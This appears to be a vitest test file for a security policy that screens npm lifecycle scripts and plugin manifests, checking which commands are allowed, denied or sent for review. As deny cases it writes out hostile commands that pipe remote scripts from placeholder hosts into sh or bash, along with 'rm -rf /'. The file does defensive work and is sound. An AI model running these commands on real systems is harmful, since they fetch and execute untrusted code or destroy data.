import { describe, it, expect } from "vitest";
import { evaluateScriptPolicy, evaluateManifestScripts, DEFAULT_POLICY } from "../src/scripts";

describe("lifecycle script policy", () => {
  it("denies curl | sh regardless of phase", () => {
    const r = evaluateScriptPolicy({
      dependency: "evil-pkg",
      phase: "postinstall",
      command: "curl -fsSL https://x.example/install.sh | sh",
    });
    expect(r.decision).toBe("deny");
  });

  it("denies wget | sh", () => {
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "wget -qO- https://x.example/i.sh | bash" });
    expect(r.decision).toBe("deny");
  });

  it("denies rm -rf /", () => {
    const r = evaluateScriptPolicy({ dependency: "x", phase: "preinstall", command: "rm -rf /" });
    expect(r.decision).toBe("deny");
  });

  it("default-denies when phase is not in defaultAllow", () => {
    const r = evaluateScriptPolicy({
      dependency: "left-pad",
      phase: "postinstall",
      command: "node ./build.js",
    });
    expect(r.decision).toBe("require-review");
  });

  it("allows node script.js when phase is allow-listed", () => {
    const policy = { ...DEFAULT_POLICY, defaultAllow: ["postinstall" as const] };
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "node ./build.js" }, policy);
    expect(r.decision).toBe("allow");
  });

  it("requires review for arbitrary shell commands", () => {
    const policy = { ...DEFAULT_POLICY, defaultAllow: ["postinstall" as const] };
    const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "echo hi" }, policy);
    expect(r.decision).toBe("require-review");
  });
});

// ─── B18: evaluateManifestScripts ────────────────────────────────────────────

describe("evaluateManifestScripts", () => {
  it("flags postinstall curl | sh as not ok", () => {
    const { ok, issues } = evaluateManifestScripts({
      name: "evil-plugin",
      scripts: { postinstall: "curl evil | sh" },
    });
    expect(ok).toBe(false);
    expect(issues).toHaveLength(1);
    expect(issues[0].decision).toBe("deny");
    expect(issues[0].phase).toBe("postinstall");
  });

  it("flags require-review for npm run build under default-deny policy", () => {
    const { ok, issues } = evaluateManifestScripts({
      name: "my-plugin",
      scripts: { build: "npm run build" },
    });
    // build is not a recognized lifecycle phase, but npm run build matches soft allowlist.
    // Under default-deny (no phases in defaultAllow), it should be require-review.
    expect(ok).toBe(false);
    expect(issues).toHaveLength(1);
    expect(issues[0].decision).toBe("require-review");
  });

  it("flags npx --yes in dependency lifecycle", () => {
    const { ok, issues } = evaluateManifestScripts({
      name: "my-plugin",
      dependencies: [{ type: "npm", name: "x", lifecycle: { install: "npx --yes foo" } }],
    });
    expect(ok).toBe(false);
    expect(issues).toHaveLength(1);
    expect(issues[0].decision).toBe("deny");
    expect(issues[0].dependency).toBe("x");
  });

  it("allows a manifest with no scripts", () => {
    const { ok, issues } = evaluateManifestScripts({ name: "clean-plugin" });
    expect(ok).toBe(true);
    expect(issues).toHaveLength(0);
  });
});
